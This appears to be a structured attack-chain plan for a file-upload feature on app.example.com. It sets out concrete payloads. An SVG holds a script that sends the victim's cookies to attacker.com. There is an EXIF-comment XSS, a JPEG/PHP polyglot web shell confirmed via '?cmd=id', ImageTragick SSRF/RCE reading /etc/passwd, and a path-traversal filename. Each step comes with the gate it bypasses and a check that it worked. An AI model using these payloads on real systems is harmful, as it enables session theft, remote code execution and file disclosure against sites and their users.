post_processing: ImageMagick thumbnail generation (thumb.jpg created after upload, status: processing → ready)

chain_steps.request_mutation: Upload filename='payload.svg' with Content-Type: image/svg+xml. File content: <svg xmlns='http://www.w3.org/2000/svg'><script>fetch('https://attacker.com/?c='+document.cookie)</script></svg>
chain_steps.gate_to_pass: Extension .svg not in blocklist (.php, .jsp, .sh only); Content-Type: image/svg+xml accepted by image/* allowlist; file served inline without Content-Disposition: attachment
chain_steps.next_step_requires: Victim must open /documents/<id>/payload.svg in browser — script executes in app.example.com origin context

chain_steps.request_mutation: Upload a valid JPEG with EXIF comment field set to: <script>alert(document.domain)</script>. If thumbnail generation embeds EXIF data in output, XSS fires when thumb.jpg is rendered as HTML by a vulnerable viewer.
chain_steps.gate_to_pass: ImageMagick may copy EXIF metadata into generated thumbnail; server does not strip metadata before serving
chain_steps.next_step_requires: Thumbnail must be opened by a component that renders EXIF as HTML (PDF viewer, metadata display panel, or admin dashboard showing file properties)

chain_steps.request_mutation: Create a file that is simultaneously valid JPEG (magic bytes FF D8 FF) and contains a PHP web shell appended after JPEG EOF (FF D9) marker. Upload with filename='shell.php.jpg' and Content-Type: image/jpeg.
chain_steps.gate_to_pass: Extension check only validates last extension (.jpg passes). Content-Type: image/jpeg accepted. Magic byte check (if any) satisfied by JPEG header. If PHP interpreter is configured for .php.jpg or aliases exist, shell executes.
chain_steps.next_step_requires: Web server must execute .php.jpg as PHP — requires misconfigured AddHandler or FilesMatch directive. Confirm by requesting /documents/<id>/shell.php.jpg and checking for PHP execution.

execution_surfaces: ImageMagick thumbnail generation — vulnerable to CVE-2016-3714 (ImageTragick) on unpatched versions; SVG/PDF inputs to ImageMagick can achieve SSRF or RCE
Local disk with direct path serving — if .htaccess upload is possible, PHP execution via AddType directive
path_traversal_note: Filename preserved in URL (/documents/<id>/<filename>) but id prefix likely prevents directory escape. Test filename='../../../etc/passwd' — if server strips path separators, risk is low; if not, local file read possible.
stop_conditions: SVG XSS: request /documents/<id>/payload.svg in browser — if script tag in response body is served with Content-Type: image/svg+xml, payload executes in app.example.com origin
ImageMagick RCE (ImageTragick): upload SVG referencing file:///etc/passwd as image href — if thumbnail generation fetches the file, contents appear in thumb.jpg EXIF
PHP polyglot: GET /documents/<id>/shell.php.jpg?cmd=id — if response contains 'uid=' then PHP execution is confirmed
summary: SVG upload bypasses extension blocklist and inline serving enables stored XSS in app.example.com origin; ImageMagick post-processing creates secondary RCE/SSRF surface via ImageTragick
